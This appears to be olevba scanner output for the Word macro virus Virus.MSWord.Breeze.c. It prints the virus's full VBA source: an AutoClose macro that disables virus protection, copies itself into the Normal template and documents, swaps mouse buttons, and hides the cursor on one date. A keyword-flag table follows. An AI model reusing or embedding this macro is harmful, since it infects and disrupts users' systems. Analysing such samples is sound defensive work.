olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Breeze.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Breeze.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO storm.bas 
in file: ./Virus.MSWord.Breeze.c - OLE stream: 'Macros/VBA/storm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function SwapMouseButton Lib "USER32" (ByVal bSwap As Long) As Long
Private Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer
Sub AutoClose()
On Error Resume Next
Options.VirusProtection = False
If Len(NormalTemplate.VBProject.VBComponents.Item("storm")) < 1 Then Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "storm", wdOrganizerObjectProjectItems
If Len(ActiveDocument.VBProject.VBComponents.Item("storm")) < 1 Then Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "storm", wdOrganizerObjectProjectItems
ActiveDocument.Save
J = Minute(Now()) Mod 2
k = day(Now()) Mod 2
If k <> 0 And J = 0 Then
      SwapMouseButton &H2
End If
If Month(Now()) = 8 And day(Now()) = 11 Then
    While ShowCursor(False) >= 0
    Wend
    MsgBox "Solar Eclipse 12.35 PM"
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

